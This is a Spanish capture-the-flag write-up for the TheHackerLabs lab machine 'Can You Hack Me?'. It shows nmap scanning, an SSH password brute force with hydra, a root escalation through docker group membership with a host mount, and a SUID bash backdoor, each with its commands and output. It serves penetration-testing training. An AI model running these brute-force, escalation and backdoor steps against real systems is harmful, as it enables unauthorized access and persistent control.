---
title: "Can You Hack Me? - TheHackerLabs"
date: 2025-06-18
draft: false
slug: "THL-writeup-canYouHackMe"
excerpt: "Esta fue una máquina sencilla. Después de descubrir que se aplicaba Virtual Hosting y de registrar el dominio en el /etc/hosts, logramos entrar a la página web activa, pero al no encontrar nada, revisamos el código fuente, en donde encontramos el nombre de un usuario. Aplicamos fuerza bruta al usuario que encontramos, logrando ganar acceso a la máquina víctima vía SSH. Dentro, descubrimos que este usuario está dentro del grupo de Docker, lo que nos permite crear un contenedor que almacena una montura de la raíz del sistema de la máquina. Gracias a esto, también podemos generar cambios que se verán reflejados fuera del contenedor, con lo que logramos escalar privilegios al darle permisos SUID a la Bash."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Linux", "SSH", "Virtual Hosting", "Brute Force Attack", "Abusing Docker Group", "Privesc - Abusing Docker Group", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "echo"
  - "grep"
  - "hydra"
  - "ssh"
  - "sudo"
  - "tail"
  - "id"
  - "docker"
  - "cp"
  - "chmod"
  - "bash"
links:
  - "https://www.securitum.com/privilege_escalation_through_docker_group_membership_and_sudo_backdoor.html"
  - "https://gtfobins.github.io/gtfobins/docker/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-canYouHackMe/canYouHackMe.jpg"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.10.120
PING 192.168.10.120 (192.168.10.120) 56(84) bytes of data.
64 bytes from 192.168.10.120: icmp_seq=1 ttl=64 time=5.02 ms
64 bytes from 192.168.10.120: icmp_seq=2 ttl=64 time=6.45 ms
64 bytes from 192.168.10.120: icmp_seq=3 ttl=64 time=2.58 ms
64 bytes from 192.168.10.120: icmp_seq=4 ttl=64 time=3.71 ms

--- 192.168.10.120 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3140ms
rtt min/avg/max/mdev = 2.577/4.439/6.453/1.448 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.10.120 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-18 11:20 CST
Initiating ARP Ping Scan at 11:20
Scanning 192.168.10.120 [1 port]
Completed ARP Ping Scan at 11:20, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:20
Scanning 192.168.10.120 [65535 ports]
Discovered open port 80/tcp on 192.168.10.120
Discovered open port 22/tcp on 192.168.10.120
Completed SYN Stealth Scan at 11:20, 20.15s elapsed (65535 total ports)
Nmap scan report for 192.168.10.120
Host is up, received arp-response (0.0016s latency).
Scanned at 2025-06-18 11:20:28 CST for 21s
Not shown: 35469 closed tcp ports (reset), 30064 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 20.39 seconds
           Raw packets sent: 101844 (4.481MB) | Rcvd: 35474 (1.419MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Hay 2 puertos abiertos, supongo que la intrusión será por la página web activa en el **puerto 80**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80 192.168.10.120 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-18 11:21 CST
Nmap scan report for 192.168.10.120
Host is up (0.0013s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   256 a8:da:3d:7d:c8:cd:c7:69:ce:ed:13:fa:de:b9:96:50 (ECDSA)
|_  256 03:24:b9:cc:0b:c2:15:09:db:73:9b:b5:24:d5:41:ca (ED25519)
80/tcp open  http    Apache httpd 2.4.58

|_http-title: Did not follow redirect to http://canyouhackme.thl
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.00 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

El escaneo nos está mostrando que al entrar a la página web usando la IP, nos redirige a la página `http://canyouhackme.thl`, que no podremos ver, a menos que la registremos en el `/etc/hosts`.

Esto indica que se está aplicando **Virtual Hosting**.

De ahí en fuera, no hay más información relevante, así que, vayamos a ver esa página web.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-canYouHackMe/Captura1.png">
</p>

No se ve nada.

Como lo mencioné antes, debemos registrar el dominio en el `/etc/hosts`:
```bash
echo "192.168.10.120 canyouhackme.thl" >> /etc/hosts
```

Ahora, recarga la página y debería funcionar:

<p align="center">
<img src="/assets/images/THL-writeup-canYouHackMe/Captura2.png">
</p>

Listo.

Como tal, la página no muestra nada más.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-canYouHackMe/Captura3.png">
</p>

Nada que nos ayude.

Si revisamos el código fuente, encontraremos un comentario interesante:

<p align="center">
<img src="/assets/images/THL-writeup-canYouHackMe/Captura4.png">
</p>

Tenemos el nombre de un usuario llamado **juan**.

Te diría que aplicáramos **Fuzzing** para ver qué podemos encontrar, pero no encontremos nada.

Así que con el nombre que ya tenemos, vamos a aplicar fuerza bruta el **servicio SSH** para poder ganar acceso a la máquina.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Fuerza Bruta al Servicio SSH y Ganando Acceso a la Máquina Víctima {#SSH}

Para esto, utilizaremos la herramienta **hydra** y usaremos el wordlist **rockyou.txt**:
```bash
hydra -l 'juan' -P /usr/share/wordlists/rockyou.txt ssh://192.168.10.120 -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-18 12:00:53
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://192.168.10.120:22/
[22][ssh] host: 192.168.10.120   login: juan   password: *****
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 31 final worker threads did not complete until end.
[ERROR] 31 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-18 12:01:52
```
Excelente, tenemos su contraseña. Vamos a comprobar si funciona.

Entremos al **servicio SSH**:
```bash
ssh juan@192.168.10.120
```

Pasa algo extraño al entrar, ya que se limpia la terminal y nos muestra la flag del usuario:
```bash
User flag: ***********
juan@TheHackersLabs-CanYouHackMe:~$
juan@TheHackersLabs-CanYouHackMe:~$ whoami
juan
```

## Post Explotación {#Post}

### Enumeración de la Máquina Víctima {#linEnum}

Podemos ver que este usuario no tiene privilegios:
```bash
juan@TheHackersLabs-CanYouHackMe:~$ sudo -l
[sudo] password for juan: 
Sorry, user juan may not run sudo on TheHackersLabs-CanYouHackMe.
```

Revisemos los archivos de este usuario:
```bash
juan@TheHackersLabs-CanYouHackMe:~$ ls -la
total 36
drwxr-x--- 5 juan juan 4096 sep  7  2024 .
drwxr-xr-x 3 root root 4096 sep  7  2024 ..
-rw------- 1 juan juan  373 jun 18 18:01 .bash_history
-rw-r--r-- 1 juan juan  220 sep  7  2024 .bash_logout
-rw-r--r-- 1 juan juan 3846 sep  7  2024 .bashrc
drwx------ 2 juan juan 4096 sep  7  2024 .cache
drwxrwxr-x 3 juan juan 4096 sep  7  2024 .local
-rw-r--r-- 1 juan juan  807 sep  7  2024 .profile
drwx------ 3 juan juan 4096 sep  7  2024 snap
```
No encontramos la flag.

Recordando que al iniciar se limpia la terminal y nos muestra la flag, podemos revisar los archivos `.bashrc` y `.profile` para ver si ejecutan algo cuando este usuario inicia sesión.

Así, encontramos que el archivo `.bashrc` es el que limpia la terminal y muestra la flag:
```bash
juan@TheHackersLabs-CanYouHackMe:~$ cat .bashrc | tail -n 4
fi
export TERM=xterm
clear
echo "User flag: **********"
```

Curiosamente, también podemos ver que el archivo **.bash_history**, que contiene el historial de comandos usados, no se vacía, por lo que podemos leer qué comandos se han ejecutado:
```bash
juan@TheHackersLabs-CanYouHackMe:~$ cat .bash_history 
rm .bash_history 
cd /var/mail
ls
clear
cat para\ juan.txt 
cat para\ root.txt 
clear
docker run -it -v /:/mnt alpine
docker rm -f flamboyant_mclaren 
docker rmi alpine
clear
docker run -it -v /:/mnt alpine
clear
su
exit
...
```
Vemos algunas cosillas, pero lo más interesante, es el uso de **docker** para crear una montura de **alpine**.

Y, si revisamos a qué grupos pertenece este usuario, descubrimos que estamos dentro del **grupo docker**:
```bash
juan@TheHackersLabs-CanYouHackMe:~$ id
uid=1001(juan) gid=1001(juan) groups=1001(juan),100(users),1002(docker)
```

Esto quiere decir que podemos ocupar **docker**, aunque no con privilegios de **Root**:
```bash
juan@TheHackersLabs-CanYouHackMe:~$ which docker
/snap/bin/docker
juan@TheHackersLabs-CanYouHackMe:~$ docker

Usage:  docker [OPTIONS] COMMAND

A self-sufficient runtime for containers
...
```

### Escalando Privilegios Abusando de Grupo Docker {#docker}

El siguiente blog explica cómo abusar del **grupo docker** y cómo dejar una **backdoor**:
* <a href="https://www.securitum.com/privilege_escalation_through_docker_group_membership_and_sudo_backdoor.html" target="_blank">Privilege Escalation through Docker group membership and… sudo backdoor?</a>

Además, también podemos ocupar la **guía de GTFOBins**:
* <a href="https://gtfobins.github.io/gtfobins/docker/" target="_blank">GTFOBins: docker</a>

En mi caso, utilizaré la **guía de GTFOBins**, que nos muestra lo siguiente:

<p align="center">
<img src="/assets/images/THL-writeup-canYouHackMe/Captura5.png">
</p>

Utilizaremos ese comando.

Vamos a desglosarlo:
* `-v /:/mnt`: monta todo el sistema raíz del host (`/`) en el contenedor, en la ruta `/mnt`.
* `--rm`: elimina el contenedor al salir.
* `-it alpine`: inicia un contenedor interactivo con **Alpine Linux**.
* `chroot /mnt sh`: cambia la raíz del entorno al sistema del host, dandonos acceso como **Root** al sistema montado.

En resumen, el comando crea un contenedor de toda la raíz, de manera que los cambios que hagamos, se vean reflejados fuera del contenedor (`-v /:/mnt`).

Para poder ejecutarlo, necesitamos la imagen de **Alpine**, que podemos revisar si existe dentro de la máquina con **docker**:
```bash
juan@TheHackersLabs-CanYouHackMe:~$ docker images
REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
alpine       latest    91ef0af61f39   9 months ago   7.8MB
```
Ahí está.

Ahora, ejecutemos ese comando:
```bash
juan@TheHackersLabs-CanYouHackMe:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt bash
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

Root flag: ********
root@4a0530af3600:/#
```
Excelente, parece que también nos dio la flag del **Root**.

Movámonos al directorio del **Root**:
```bash
root@4a0530af3600:/# cd root/
root@4a0530af3600:~# ls -la
total 40
drwx------  6 root root 4096 Sep  8  2024 .
drwxr-xr-x 21 root root  540 Jun 18 17:19 ..
-rw-------  1 root root  768 Jun 18 20:40 .bash_history
-rw-r--r--  1 root root 3157 Sep  7  2024 .bashrc
drwx------  2 root root 4096 Sep  7  2024 .cache
drwxr-xr-x  3 root root 4096 Sep  5  2024 .local
-rw-r--r--  1 root root  161 Apr 22  2024 .profile
drwx------  2 root root 4096 Sep  5  2024 .ssh
-rw-------  1 root root  767 Sep  7  2024 .viminfo
-rw-r--r--  1 root root   33 Sep  8  2024 root.txt
drwx------  3 root root 4096 Sep  7  2024 snap
```
Ahí mismo encontramos la flag.

Y si revisamos el archivo `.bashrc`, veremos que igual está ahí y se obtendrá cada vez que el **Root** inicie sesión:
```bash
root@4a0530af3600:~# cat .bashrc | tail -n 2
#fi
echo "Root flag: *********"
```

Como mencioné antes, cualquier cambio que hagamos aquí, se verá reflejado afuera del contenedor.

Entonces, podemos utilizar varias formas para escalar privilegios, por ejemplo, cambiando la contraseña del **Root** modificando el `/etc/passwd`, dándole **permisos SUID** a la **Bash**, etc.

Hagamos esto último.

Revisemos primero qué permisos tiene la **Bash** afuera del contenedor:
```bash
juan@TheHackersLabs-CanYouHackMe:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1446024 mar 31  2024 /bin/bash
```

Creemos el contenedor de nuevo y asignemosle **permisos SUID** a la **Bash**:
```bash
root@a5fe8376ab31:/# chmod u+s bin/bash
chmod: changing permissions of 'bin/bash': Read-only file system
```
Parece que no está aplicando el cambio, esto porque el sistema de archivos donde está `/bin/bash` está montado como de solo lectura.

Entonces, vamos a copiar la **Bash** en el directorio del **usuario juan**:
```bash
root@a5fe8376ab31:/# cp bin/bash /home/juan/
root@a5fe8376ab31:/# ls -la /home/juan/
total 4436
drwxr-x--- 6 juan juan    4096 Jun 18 21:49 .
drwxr-xr-x 3 root root    4096 Sep  7  2024 ..
-rw------- 1 juan juan     385 Jun 18 21:50 .bash_history
-rw-r--r-- 1 juan juan     220 Sep  7  2024 .bash_logout
-rw-r--r-- 1 juan juan    3846 Sep  7  2024 .bashrc
drwx------ 2 juan juan    4096 Sep  7  2024 .cache
drwx------ 3 juan juan    4096 Jun 18 18:05 .gnupg
drwxrwxr-x 3 juan juan    4096 Sep  7  2024 .local
-rw-r--r-- 1 juan juan     807 Sep  7  2024 .profile
-rwxr-xr-x 1 root root 1396520 Jun 18 21:51 bash
drwx------ 3 juan juan    4096 Sep  7  2024 snap
```

Ahora, démosle **permisos SUID** a esa copia:
```bash
root@a5fe8376ab31:/# chmod u+s /home/juan/bash
root@a5fe8376ab31:/# ls -la /home/juan/bash
-rwsr-xr-x 1 root root 1396520 Jun 18 21:51 /home/juan/bash
```
Muy bien.

Salgamos del contenedor y deberíamos tener la **Bash** con los **permisos SUID**:
```bash
juan@TheHackersLabs-CanYouHackMe:~$ ls -la
total 4436
drwxr-x--- 6 juan juan    4096 jun 18 21:49 .
drwxr-xr-x 3 root root    4096 sep  7  2024 ..
-rwsr-xr-x 1 root root 1396520 jun 18 21:51 bash
...
```

Genial, ya podemos ejecutar la **Bash** copiada con privilegios:
```bash
juan@TheHackersLabs-CanYouHackMe:~$ ./bash -p
bash-5.1# whoami
root
```
Podemos leer la flag de nuevo, pero como ya la tenemos, no será necesario. 

Entonces, con esto terminamos la máquina.
